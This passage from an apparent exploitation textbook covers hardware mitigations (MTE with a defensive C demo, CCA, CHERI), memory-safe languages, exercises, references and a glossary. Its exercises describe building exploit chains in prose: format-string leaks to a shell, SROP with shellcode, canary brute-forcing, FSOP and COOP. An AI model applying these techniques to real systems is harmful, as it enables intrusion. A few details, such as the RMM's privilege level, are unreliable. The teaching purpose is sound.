The performance gap between SYNC and ASYNC modes is the primary driver of Android's deployment strategy: SYNC for security-critical daemons where deterministic detection is worth the overhead, ASYNC for system-wide deployment where the 3-5% cost is acceptable at scale.

**Userspace MTE configuration via prctl.** Applications on MTE-capable hardware can configure their own MTE mode using `prctl(PR_SET_TAGGED_ADDR_CTRL)`. This is the mechanism Android's Zygote process uses to enable MTE for child processes:

```c
#include <sys/prctl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>

/* MTE control flags for PR_SET_TAGGED_ADDR_CTRL */
#define PR_MTE_TCF_NONE     0
#define PR_MTE_TCF_SYNC     (1UL << 1)
#define PR_MTE_TCF_ASYNC    (1UL << 2)
#define PR_MTE_TAG_MASK     (0xffffUL << 3)

/* Enable MTE in SYNC mode, allow all 16 tag values */
int enable_mte_sync(void) {
    unsigned long ctrl = PR_TAGGED_ADDR_ENABLE
                       | PR_MTE_TCF_SYNC
                       | (0xfffeUL << 3);  /* exclude tag 0 */

    if (prctl(PR_SET_TAGGED_ADDR_CTRL, ctrl, 0, 0, 0) != 0) {
        perror("prctl(PR_SET_TAGGED_ADDR_CTRL)");
        return -1;
    }
    return 0;
}

/* Allocate MTE-tagged memory */
void *mte_alloc(size_t size) {
    void *p = mmap(NULL, size,
                   PROT_READ | PROT_WRITE | PROT_MTE,
                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (p == MAP_FAILED)
        return NULL;

    /*
     * Use IRG (Insert Random Tag) and STG (Store Allocation Tag)
     * to assign a random tag to the pointer and memory.
     * These are ARMv8.5 MTE instructions.
     */
    __asm__ volatile(
        "irg %0, %0\n"        /* Insert random tag into pointer */
        "stg %0, [%0]\n"      /* Store tag to memory granule    */
        : "+r"(p)
    );
    return p;
}

int main(void) {
    if (enable_mte_sync() != 0)
        return 1;

    char *buf = mte_alloc(4096);
    if (!buf) return 1;

    buf[0] = 'A';   /* Valid: tag matches */
    printf("MTE write succeeded at %p\n", buf);

    /*
     * Simulating a tag mismatch (do NOT do this in production):
     * Corrupt the pointer tag to force a mismatch.
     * In SYNC mode, the next access raises SIGSEGV with
     * si_code == SEGV_MTESERR.
     */
    char *bad = (char *)((unsigned long)buf ^ (1UL << 56));
    /* bad[0] = 'B';  <-- would trigger Tag Check Fault */

    return 0;
}
```

The `PROT_MTE` flag on `mmap` enables tag storage for the mapping. Without it, tag operations are silently ignored. The `IRG` instruction generates a random tag (excluding values masked out by the `PR_MTE_TAG_MASK` in prctl), and `STG` writes the tag to the corresponding granule in tag memory. This combination ensures that every allocation has a unique random tag, and any access through a pointer with a mismatched tag raises a hardware fault.

### 12.3 ARM CCA (Confidential Compute Architecture)

ARM Confidential Compute Architecture introduces Realms — isolated execution environments protected by a hardware Root of Trust (the Realm Management Monitor, RMM) that runs at a privilege level (EL3/Secure world) above the operating system. Realms provide memory isolation that the OS kernel cannot breach — even a compromised kernel cannot read Realm memory, because the Granule Protection Table (GPT) enforced by the hardware prevents non-Realm code from accessing Realm-assigned physical pages.

CCA's relevance to mitigation bypass is indirect but significant: by moving security-critical computation into Realms, the attack surface for data extraction is reduced even when the kernel is fully compromised. Traditional exploit chains that escalate from userspace to kernel to data extraction (reading keys, credentials, secrets from kernel memory) are thwarted because the target data resides in a Realm whose memory is hardware-inaccessible from kernel context.

### 12.4 CHERI capability hardware

CHERI (Capability Hardware Enhanced RISC Instructions) represents the most fundamental architectural change to the exploitation landscape since NX bit enforcement. CHERI replaces raw pointers with capabilities — 128-bit (or 129-bit, with a tag bit) values that encode not just an address but also bounds, permissions, and a hardware-enforced validity tag.

**Capability structure.** A CHERI capability contains: the virtual address (64 bits), the base and length bounds (compressed into the remaining bits using a floating-point-like encoding), permissions (load, store, execute, seal, etc.), and a 1-bit tag that indicates whether the capability is valid. The tag bit is stored out-of-band (in dedicated tag memory, similar to MTE but per-capability rather than per-granule).

**Capability encoding detail (Morello / CHERI-RISC-V 128-bit format).** The 128-bit in-memory representation compresses bounds using a floating-point scheme called CHERI Concentrate:

```
Bit layout (128-bit capability, Morello variant):

  127                64 63                 0
  +--------------------+--------------------+
  | metadata (64 bits) | address (64 bits)  |
  +--------------------+--------------------+

  metadata[63:46] = permissions (18 bits)
    Load, Store, Execute, LoadCap, StoreCap, StoreLocalCap,
    Seal, Unseal, System, BranchSealedPair, MutableLoad,
    CompartmentID, Executive, Global, ...

  metadata[45:42] = object type / otype (4 bits in compressed form)
    0 = unsealed (normal capability)
    nonzero = sealed (opaque, cannot be dereferenced directly)

  metadata[41:0] = compressed bounds (42 bits)
    Encoded as:
      E  (exponent, 6 bits) — determines granularity
      T  (top bits, 14 bits) — encodes upper bound
      B  (base bits, 14 bits) — encodes lower bound
      IE (internal exponent flag, 1 bit)
      ...remaining bits for alignment correction

  Tag bit (1 bit, stored out-of-band):
    1 = valid capability
    0 = data / invalidated capability
    ANY non-capability store to a capability-width location
    clears the tag bit, preventing forgery via raw writes.
```

The compressed bounds encoding means that capability bounds must be naturally aligned to a power-of-two granularity for large allocations. A 4 KB allocation can have byte-precise bounds, but a 1 GB allocation has bounds rounded to the nearest 4 KB boundary. This is acceptable for most allocations but means that very large allocations have slightly coarser bounds than the programmer might expect. The compiler and allocator cooperate to ensure that allocations are padded to satisfy the alignment requirement.

The hardware enforces monotonicity: software can narrow a capability's bounds or remove permissions, but it can never widen bounds or add permissions. This property, combined with the tag bit (which only hardware can set), means that capability forgery is architecturally impossible — the attacker cannot synthesize a capability with wider bounds or more permissions than those granted by the system.

**Impact on exploit classes.** Spatial safety violations (buffer overflows) are eliminated because every memory access through a capability is bounds-checked by the hardware. A buffer overflow that writes past the capability's bounds raises a hardware exception. Temporal safety (use-after-free) is addressed through capability revocation: when memory is freed, all capabilities pointing to it are invalidated by sweeping the capability tag memory. The Morello evaluation board (ARM's CHERI prototype, based on Neoverse N1) demonstrated these properties on FreeBSD CheriBSD.

**Performance and adoption.** The Morello evaluation (2022-2024) measured approximately 0-5% overhead for pure-capability (all pointers are capabilities) compilation on memory-intensive workloads. The overhead comes from the doubled pointer size (128-bit capabilities vs. 64-bit pointers) and the bounds-check logic. ARM has indicated that production CHERI implementations are on the roadmap, though no shipping commercial silicon is available as of mid-2025. The transition cost is significant: all software must be recompiled (or compatibility-wrapped) for capability-aware operation.

**Implications for this chapter.** If CHERI reaches mainstream deployment, entire sections of this chapter become irrelevant. ASLR bypass (§1) is unnecessary because the attacker cannot forge capabilities with arbitrary addresses. DEP bypass (§2) is mitigated because capabilities enforce W^X at the pointer level. Heap exploitation (cross-reference Domain 3) is fundamentally changed because bounds-checked capabilities prevent out-of-bounds access and capability revocation prevents use-after-free. The remaining attack surface would be logic bugs, confused-deputy attacks, and side channels — not memory corruption.

### 12.5 Memory-safe language adoption

The most effective long-term mitigation against the techniques in this chapter is eliminating memory corruption entirely through memory-safe languages. The industry trajectory is clear: Android's new native code is increasingly written in Rust (33% of new Android platform native code in 2023), Chrome is migrating security-critical components to Rust, the Linux kernel accepts Rust for new modules (since Linux 6.1), and Microsoft has announced Rust adoption for Windows system components.

The impact is gradual — legacy C/C++ codebases will persist for decades — but measurable. Google's analysis of Android vulnerability data shows that memory safety bugs dropped from 76% of critical/high-severity vulnerabilities in 2019 to 24% in 2024, directly correlated with the increasing proportion of memory-safe code. As the memory-unsafe code fraction decreases, the attack surface for the techniques in this chapter shrinks proportionally.

The remaining attack surface in memory-safe languages is `unsafe` code blocks (§5.7 for Rust), FFI boundaries (where Rust calls C libraries), and logic bugs that do not involve memory corruption. These represent a fundamentally different — and much smaller — attack surface than the current landscape of buffer overflows, use-after-free, and type confusion that this chapter documents.

### 12.6 Compartmentalization and sandboxing evolution

Beyond per-process mitigations, the trend toward fine-grained compartmentalization reduces the value of any single exploit. Chrome's site isolation ensures that a renderer exploit for one site cannot access another site's data. WebAssembly's linear-memory model confines wasm modules to their own address range, preventing cross-module corruption. Capability-based operating systems (seL4, Capsicum on FreeBSD) enforce least-privilege at the IPC level, ensuring that a compromised component has minimal ability to affect others.

The interaction with exploit mitigations is synergistic: even if an attacker bypasses DEP, ASLR, canaries, and CFI within a sandboxed renderer process, the sandbox boundary (seccomp on Linux, PPAPI sandbox on Chrome, App Sandbox on macOS) prevents the exploit from reaching high-value targets (filesystem, network, other processes). Breaking the sandbox requires a second exploit targeting the sandbox boundary — typically a kernel vulnerability, IPC parsing bug, or broker-process logic flaw. The defender's strategy is to make each compartment as hard to exploit as possible while minimizing the blast radius of any successful exploit.

---

## 13. Cross-references

**To Domain 1:** GOT overwrite targets (Chapter 1A §11), RELRO (Chapter 1B §5.1), CET in `PT_GNU_PROPERTY` (Chapter 1B §5.3), `_IO_FILE` vtable validation in PE load config (Chapter 2 §11 for CFG/XFG).

**To Domain 2:** ASLR entropy (Chapter 2A §5), vsyscall (Chapter 2A §6.3), `mprotect`/`mmap` (Chapter 2A §8), seccomp filtering of `mprotect` (Chapter 2B §3), KPTI (Chapter 2A §10.3).

**To Domain 3:** Format-string leaks (Chapter 3A §5), heap metadata leaks (Chapter 3B §1, unsorted bin `fd`/`bk`), ptmalloc2 safe-linking (Chapter 3B §3.2), `__malloc_hook` removal (this chapter §4.2). The vulnerability classes in Domain 3 are the bugs exploited by the bypass techniques in this chapter — every section here assumes a Domain 3 primitive as the starting point.

**To Domain 4:** All code-reuse techniques (ROP, JOP, COOP, SROP, BROP) are the payloads that DEP bypass enables. CET/PAC/CFI are the defenses this chapter's §5 and §7 attempt to bypass. The SROP technique (Domain 4 §7) is referenced in §2.7 as a compact DEP bypass mechanism.

**To Domain 5:** KASLR bypass (§6) applies to kernel exploitation. Kernel `modprobe_path` overwrite (Chapter 5A §5.2) bypasses kernel-level DEP because it doesn't execute injected code — it overwrites a string and tricks the kernel into executing an existing binary. The eBPF verifier leaks (§6.3) are often the first stage of kernel exploit chains documented in Domain 5.

---

## Exercises

Hands-on exercises for this chapter. For guided lab walkthroughs see `tutorials/tutorial_domain6_ch6A_mitigation_bypass_lab.md`.

1. **ASLR bypass via format-string leak.** Given a PIE binary with a `printf(user_input)` vulnerability and full RELRO, write a pwntools exploit that: (a) leaks a `__libc_start_main` return address from the stack via `%p`, (b) computes the libc base, (c) derives a one-gadget address, and (d) overwrites a writable code-pointer target (e.g., `__exit_funcs` with a forged PTR_MANGLE'd entry) to obtain a shell. Verify against glibc 2.35+ where `__malloc_hook` is removed. Measure the exploit's reliability over 100 runs and explain any failures.

2. **DEP bypass with SROP.** Construct a Sigreturn-Oriented Programming chain that calls `mprotect` to make a `.bss` region executable, then pivots to shellcode placed there. Use only two gadgets: a `sigreturn` syscall and a `syscall; ret`. Compare the chain length (in bytes) and gadget requirements against a traditional `pop rdi; pop rsi; pop rdx; call mprotect` ROP chain. Test on a binary compiled with `-fstack-protector-all -z relro -z now -pie` and document which mitigations the SROP chain defeats and which it requires a prior leak to bypass.

3. **Stack canary brute-force against a forking server.** Write a byte-at-a-time canary brute-forcer (as in §3.2) against a provided `fork()`-based TCP echo server. Instrument your exploit to: (a) record the number of attempts per byte, (b) measure total wall-clock time, (c) verify the recovered canary by including it in a successful overflow payload. Then modify the server to call `execve` after `fork` and confirm the brute-force fails (new canary per child). Calculate the theoretical vs. observed attempt counts and explain any discrepancy.

4. **Full-RELRO bypass via FSOP (_IO_FILE exploitation).** Against a glibc 2.31 binary with full RELRO and a heap overflow that can corrupt the `_IO_list_all` pointer, construct a House-of-Orange-style FSOP chain. Build a fake `_IO_FILE_plus` structure that triggers `_IO_str_overflow` with a controlled `_allocate_buffer` function pointer on `exit()`. Document the exact field offsets, the `_flags` value required to pass `_IO_str_overflow` checks, and the vtable pointer that must reference `_IO_str_jumps` (within `__libc_IO_vtables`). Test on glibc 2.31, then attempt the same on glibc 2.35 and document what additional constraints the newer glibc imposes.

5. **CFI bypass via COOP gadget discovery.** Using a C++ application compiled with Clang's `-fsanitize=cfi -fvisibility=hidden`, identify the valid-target-set for a virtual call site in the application's main loop. Use `llvm-cfi-verify` to enumerate valid targets, then search for a "W-G" (write gadget) — a virtual method that writes a field from `this` to a controlled destination. Construct a minimal COOP chain (main-loop gadget + 2 functional gadgets) that achieves an arbitrary 8-byte write, bypassing cfi-vcall. Document the target-set size and assess whether adding `-fsanitize=cfi-icall` would close the bypass.

---

## Readings and References

(retrieved: 2026-05-29)

1. Bittau, A., Belay, A., Mashtizadeh, A., Mazieres, D., and Boneh, D. "Hacking Blind." S&P 2014. Blind ROP (BROP) and canary brute-force techniques. https://www.scs.stanford.edu/~dm/home/papers/bittau:brop.pdf
2. Schuster, F. et al. "Counterfeit Object-Oriented Programming: On the Difficulty of Preventing Code Reuse Attacks in C++ Applications." S&P 2015. COOP attack against fine-grained CFI. https://ieeexplore.ieee.org/document/7163058
3. Burow, N. et al. "Control-Flow Integrity: Precision, Security, and Performance." ACM Computing Surveys, 2017. Quantitative analysis of CFI granularity vs. valid-target-set sizes. https://dl.acm.org/doi/10.1145/3054924
4. Blazakis, D. "Interpreter Exploitation: Pointer Inference and JIT Spraying." BlackHat DC 2010. Original JIT spraying technique. https://www.semanticscholar.org/paper/Interpreter-Exploitation-Blazakis/1a526050ab45579bce2b3e449edf7e43aa45e170
5. Bosman, E. and Bos, H. "Framing Signals — A Return to Portable Shellcode." S&P 2014. Sigreturn-Oriented Programming (SROP). https://ieeexplore.ieee.org/document/6956568
6. MITRE ATT&CK T1068 — Exploitation for Privilege Escalation. https://attack.mitre.org/techniques/T1068/
7. MITRE ATT&CK T1211 — Exploitation for Defense Evasion. https://attack.mitre.org/techniques/T1211/
8. CVE-2018-6789 — Exim heap overflow, partial pointer overwrite in exploitation chain. https://nvd.nist.gov/vuln/detail/CVE-2018-6789
9. CVE-2021-3156 — Sudo "Baron Samedit" heap-based buffer overflow. https://nvd.nist.gov/vuln/detail/CVE-2021-3156
10. CVE-2022-4543 — EntryBleed, KASLR bypass via CPU entry area timing. https://nvd.nist.gov/vuln/detail/CVE-2022-4543
11. Gruss, D. et al. "Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR." CCS 2016. https://dl.acm.org/doi/10.1145/2976749.2978356
12. glibc source: `elf/dl-execstack.c` (`_dl_make_stack_executable`), `stdlib/exit.c` (`__run_exit_handlers`), `libio/strops.c` (`_IO_str_overflow`). https://sourceware.org/git/?p=glibc.git
13. xairy/linux-kernel-exploitation — curated list of kernel exploitation resources and CVEs. https://github.com/xairy/linux-kernel-exploitation
14. one_gadget — tool for finding one-shot RCE gadgets in libc. https://github.com/david942j/one_gadget
15. ROPgadget — gadget finder for ROP/JOP chain construction. https://github.com/JonathanSalwan/ROPgadget

---

## Cross-References

| Domain / Chapter | Section in This Chapter | Relationship |
|---|---|---|
| Domain 1, Ch 1A–1B (ELF internals, RELRO, GOT) | §4 RELRO bypass | GOT layout and partial/full RELRO mechanics are prerequisites for understanding GOT overwrite and alternative targets |
| Domain 2, Ch 2A (ASLR, vsyscall, mprotect) | §1 ASLR bypass, §2 DEP bypass | ASLR entropy values, vsyscall fixed mapping, and mprotect semantics define the mitigation surface this chapter attacks |
| Domain 3, Ch 3A–3B (stack/heap exploitation) | §1.2 info leaks, §3 canary bypass, §4.2 FSOP | Format-string reads, heap metadata leaks, and UAF primitives are the starting bugs that feed every bypass chain |
| Domain 4, Ch 4A–4B (ROP/JOP/SROP, CET/PAC/CFI) | §2 DEP bypass, §5 CFI bypass, §7 shadow stack | Code-reuse payloads are the output of DEP bypass; CET/PAC/CFI are the defenses §5 and §7 attempt to defeat |
| Domain 5, Ch 5A (kernel exploitation, KASLR) | §6 KASLR bypass | Kernel ASLR defeat feeds kernel exploit chains; eBPF verifier leaks bridge userspace info-leak to kernel compromise |
| Domain 7, Ch 7A (Spectre, side channels) | §1.3 side-channel ASLR derandomization | Prefetch timing, TLB probing, and branch-predictor side channels provide ASLR bypass without memory corruption |

---

## Glossary

| Term | Definition |
|---|---|
| **ASLR** | Address Space Layout Randomization — OS-level randomization of code, library, stack, and heap base addresses per process execution |
| **DEP / NX** | Data Execution Prevention / No-eXecute — hardware/OS enforcement preventing code execution from data pages (stack, heap) |
| **Stack canary** | Random value placed between stack locals and the saved return address; checked on function return to detect buffer overflows |
| **RELRO** | RELocation Read-Only — ELF hardening that makes the GOT read-only after dynamic linking (partial: `.got` writable; full: entire GOT read-only) |
| **CFI** | Control-Flow Integrity — compiler/hardware enforcement restricting indirect branch targets to a validated set |
| **COOP** | Counterfeit Object-Oriented Programming — CFI bypass using chains of legitimate virtual method calls on counterfeit C++ objects |
| **FSOP** | File Stream Oriented Programming — exploitation technique corrupting glibc `_IO_FILE` structures to hijack control flow via vtable dispatch |
| **SROP** | Sigreturn-Oriented Programming — code-reuse technique using a single `sigreturn` gadget with a forged signal frame to set all registers |
| **PTR_MANGLE** | glibc pointer obfuscation: `ROL(ptr ^ pointer_guard, 17)` applied to function pointers in `exit_funcs` and similar structures |
| **Safe-linking** | glibc 2.32+ tcache/fastbin pointer obfuscation: `next_ptr XOR (chunk_addr >> 12)` to harden freelist pointers |
| **One-gadget** | A single gadget address in libc that, when called with specific register/stack constraints, executes `execve("/bin/sh", ...)` |
| **JIT spraying** | Technique embedding attacker-controlled immediate values in JIT-compiled code, creating hidden instruction sequences at unaligned offsets |
| **Partial pointer overwrite** | ASLR bypass corrupting only the lowest 1-2 bytes of a pointer, redirecting within the same page/64KB region without a full address leak |
| **Pointer guard** | Per-thread secret at `fs:0x30` used by glibc's `PTR_MANGLE`/`PTR_DEMANGLE` to protect stored function pointers |
| **PAC** | Pointer Authentication Code — ARMv8.3-A+ cryptographic MAC in pointer upper bits, verified on use; defeated by signing gadgets or PACMAN speculation |
